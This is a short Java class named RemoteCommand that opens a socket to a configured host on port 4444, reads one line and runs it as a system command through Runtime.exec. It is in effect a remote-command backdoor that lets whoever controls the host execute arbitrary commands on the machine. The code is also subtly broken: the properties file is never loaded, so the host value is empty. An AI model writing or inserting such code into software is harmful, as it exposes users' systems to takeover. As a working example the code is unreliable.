import java.net.Socket;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Properties;

class RemoteCommand {
    void run() throws Exception {
        String configName = "config.properties";
        Properties config = new Properties();
        String host = config.getProperty("host");
        Socket socket = new Socket(host, 4444);
        BufferedReader in = new BufferedReader(
            new InputStreamReader(socket.getInputStream()));
        String command = in.readLine();
        Runtime.getRuntime().exec(command);
    }
}
